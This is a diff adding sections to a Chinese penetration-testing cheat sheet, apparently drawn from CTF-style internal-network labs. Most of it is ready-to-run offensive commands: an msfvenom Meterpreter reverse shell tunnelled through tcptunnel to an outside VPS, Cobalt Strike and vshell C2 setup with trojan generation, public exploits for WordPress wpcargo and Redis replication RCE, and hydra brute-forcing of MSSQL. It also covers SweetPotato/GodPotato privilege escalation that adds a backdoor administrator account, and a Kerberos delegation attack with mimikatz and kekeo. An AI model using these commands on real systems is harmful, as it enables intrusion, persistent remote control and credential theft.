@@ -674,6 +674,32 @@ web_cam snap
 web_cam stream
 ```
 
+#### 利用 TCP 隧道让内网不出网主机上线 MSF
+
+参考链接：https://cloud.tencent.com/developer/article/1974148
+
+先制作MSF反弹Windows Shell的exe
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.2.7 LPORT=1080 -f exe > exp.exe
+```
+
+VPS上开启MSF监听
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST VPS_IP
+msf6 exploit(multi/handler) > set LPORT 4444
+```
+
+将tcptunnel上传至入口点机器，开启端口转发，将1080端口接收到的`msf reverse shell`转发至VPS的4444端口
+
+```bash
+chmod 777 tcptunnel
+./tcptunnel --local-port=1080 --remote-port=4444 --remote-host=123.56.220.163 --fork --buffer-size=8192 --stay-alive
+```
+
 ### PEASS-ng的使用
 
 支持Windows、MacOS、Linux
@@ -783,9 +809,86 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20231002-59c6f
 |   **比喻**    | 你去一个朋友家找他（他开门等你）。 | 你告诉朋友你的地址，让他来你家找你。 |
 
 
-## 内网穿透
+## 常用C2及代理工具
 
-### frp内网穿透
+### CobaltStrike
+
+服务端部署
+
+```bash
+cd server
+chmod +x teamserver
+./teamserver VPS_IP your_passwd
+```
+
+本地客户端连接
+
+```powershell
+.\cobaltstrike-client.vbs
+```
+
+
+### vshell
+
+首先上传 `v_linux_amd64` 目录到VPS
+
+```bash
+v_linux_amd64
+├── conf
+│   ├── server.key
+│   ├── server.pem
+│   └── setting.conf
+├── db
+│   ├── data.db
+│   ├── data.db-shm
+│   └── data.db-wal
+├── plugins
+│   ├── AddUser.dll
+│   ├── fscan.x64.elf
+│   ├── gost.x64.exe
+│   ├── gost.x64.so
+│   ├── mimikatz.x64.exe
+├── v_linux_amd64
+```
+
+编辑 `setting.conf` 配置文件，主要就修改一下登录的用户名和密码
+
+```
+web_username=XXXXX
+web_password=XXXXXXXXX
+```
+
+修改好以后执行以下命令启动即可
+
+```bash
+nohup ./v_linux_amd64 > vshell.log 2>&1 
+```
+
+然后访问 VPS_IP:8082 端口并输入我们设置的用户名密码，即可进入到 vshell 的控制台
+
+![](imgs/image-20251113000126741.png)
+
+我们可以新建一个监听器，配置好VPS的IP和端口即可
+
+![](imgs/image-20251113000245183.png)
+
+然后可以生成一个马
+
+![](imgs/image-20251113000614566.png)
+
+靶机运行我们生成的马以后，就可以在客户端管理看到上线的靶机了
+
+![](imgs/image-20251113000732130.png)
+
+然后就可以对靶机执行命令或者管理文件
+
+![](imgs/image-20251113000853460.png)
+
+除此之外，vshell还提供了隧道代理的功能，可以很方便的搭建内网代理
+
+![](imgs/image-20251113000938721.png)
+
+### frp
 
 配置文件内容如下
 
@@ -823,7 +926,7 @@ bind_port = 7000
 
 然后使用 proxifier 配置代理服务 公网服务器ip 6000 端口即可
 
-### ew内网穿透
+### ew
 
 在公网服务器上开放6000和7000这两个端口，并运行以下命令
 
@@ -874,7 +977,9 @@ proxychains msfconsole
 
 ## 常用的漏洞
 
-### MS17-010（永恒之蓝）漏洞
+### 系统漏洞
+
+#### MS17-010（永恒之蓝）漏洞
 
 攻击方：kali_Linux 2023
 
@@ -937,7 +1042,7 @@ back 返回上一层，然后使用 ms17_010_psexec 模块
 > 
 > 输入 `sessions {id}` 即可进入指定的session
 
-#### 不出网的情况
+**不出网的情况**
 
 假如目标靶机不出网，我们就需要用 `bind_tcp_uuid` 来让目标靶机开启一个端口监听得到一个正向的 meterpreter shell
 
@@ -955,13 +1060,17 @@ set RHOSTS 172.22.1.21
 exploit
 ```
 
-### ThinkPHP漏洞利用
+### 网站框架漏洞
+
+#### ThinkPHP漏洞利用
 
 可以使用ThinkphpGUI漏洞利用工具：https://github.com/Lotus6/ThinkphpGUI
 
-### 信呼OA漏洞利用
+![](imgs/image-20251113001922156.png)
 
-#### 信呼OA2.2-后台RCE
+#### 信呼OA漏洞利用
+
+##### 信呼OA2.2-后台RCE
 
 ```python
 
@@ -1006,12 +1115,81 @@ print(r.text)
 <?=eval($_POST['1']);?>
 ```
 
+#### WordPress漏洞利用
+
+针对WordPress框架搭建的网站，我们可以用wpscan快速扫描一下有没有已经公开的漏洞
+
+```bash
+proxychains wpscan --url http://172.22.2.18
+```
+
+##### wpcargo插件漏洞(CVE-2021-25003)
+
+直接用Github上现成的POC打就行
+
+[https://github.com/biulove0x/CVE-2021-25003](https://github.com/biulove0x/CVE-2021-25003)
+
+```bash
+proxychains python3 WpCargo.py -t http://172.22.2.18
+```
+
+![](imgs/image-20251113001442987.png)
+
+就是根据这个脚本的写法，蚁剑需要以`CMDLINUX`的方式连接
+
+![](imgs/image-20251113001514641.png)
+
+
+
+### 数据库漏洞
+
+#### MSSQL密码字典泄露
+
+可以把密码导出，然后尝试用hydra爆破
+
+```bash
+echo -n 'sa' > sa.txt # 尝试使用默认用户名
+proxychains hydra -L sa.txt -P passwd.txt 172.22.2.16 mssql -vv
+```
+
+爆破出来后用MUDT连上去就行，同时可以激活`Ole Automation Procedures`组件
+
+#### Redis主从复制漏洞
+
+Redis的默认服务端口是6379，主从复制漏洞的利用有两种方法
+
+方法一：用Github上的开源脚本
+
+[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
+
+[https://github.com/Ridter/redis-rce.git](https://github.com/Ridter/redis-rce.git)
+
+在VPS上把第一个项目中的`exp.so`文件放到第二个项目目录下，然后在第二个项目目录下执行以下命令即可
+
+```bash
+python redis-rce.py -r 47.92.135.138 -L VPS_IP -f exp.so
+```
+
+方法二：使用msf
+
+```bash
+msfconsole
+use exploit/linux/redis/redis_replication_cmd_exec
+set RHOSTS 39.98.115.167
+set SRVHOST VPS_IP
+set LHOST VPS_IP
+run
+```
+
+
+
+
 
 ## 权限提升
 
 ### Linux提权
 
-#### SUID提权
+#### SUDO提权
 
 当管理员在 /etc/sudoers 配置了某些命令免密码使用，就可以利用sudo执行命令提权
 
@@ -1021,6 +1199,13 @@ print(r.text)
 
 ```bash
 sudo mysql -e '\! /bin/sh'
+```
+
+#### SUID提权
+
+```bash
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
 ```
 
 
@@ -1047,8 +1232,38 @@ searchsploit mysql udf -m 1518
 
 ### Windows提权
 
-TODO...
+#### SweetPotato/Godpotato提权
 
+如果是数据库相关的漏洞利用
+
+可以MDUT先激活 `Ole Automation Procedures` 组件,再上传这两个exe，也可以使用下面的命令下载
+
+```powershell
+powershell -Command "Invoke-WebRequest -Uri 'http://IP:PORT/SweetPotato.exe' -OutFile 'C:\Users\MSSQLSERVER\Desktop\luna.exe'"
+```
+
+上传好后，就可以执行一下下面的命令看看当前的权限了
+
+```powershell
+# SweetPotato
+C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a whoami
+C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a "C:/Users/MSSQLSERVER/Desktop/tcp_windows_i386.exe"
+# GodPotato
+C:/Users/MSSQLSERVER/Desktop/GodPotato-NET4.exe -cmd "cmd /c whoami"
+C:/Users/MSSQLSERVER/Desktop/GodPotato-NET4.exe -cmd "cmd /c C:/Users/MSSQLSERVER/Desktop/tcp_windows_i386.exe"
+
+```
+
+![](imgs/image-20251112223243099.png)
+
+然后这个时候就可以新建一个用户，并添加到管理员组里，然后RDP连接上去
+
+```powershell
+C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "netstat -ano | findstr 3389 2>&1"
+C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "net user luna ctf114514.CTF /add 2>&1"
+C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "net localgroup administrators luna /add 2>&1"
+C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "net localgroup administrators 2>&1"
+```
 
 
 ## 域渗透
@@ -1076,6 +1291,22 @@ kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 ```bash
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
+
+
+### 委派约束攻击
+
+```bash
+# 首先右键mimikztz，用管理员权限运行mimikatz
+privilege::debug
+sekurlsa::tickets /export # 出所有的Kerberos票据
+exit
+# 使用kekeo申请服务票据
+kekeo.exe "tgs::s4u /tgt:[0;3e4]-2-1-40e10000-MSSQLSERVER$@krbtgt-XIAORANG.LAB.kirbi /user:Administrator@XIAORANG.LAB /service:cifs/DC.XIAORANG.LAB" "exit"
+# 用mimikatz导入票据
+mimikatz.exe "kerberos::ptt TGS_Administrator@XIAORANG.LAB@XIAORANG.LAB_cifs~DC.XIAORANG.LAB@XIAORANG.LAB.kirbi"
+type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+```
+
 
 ---
 
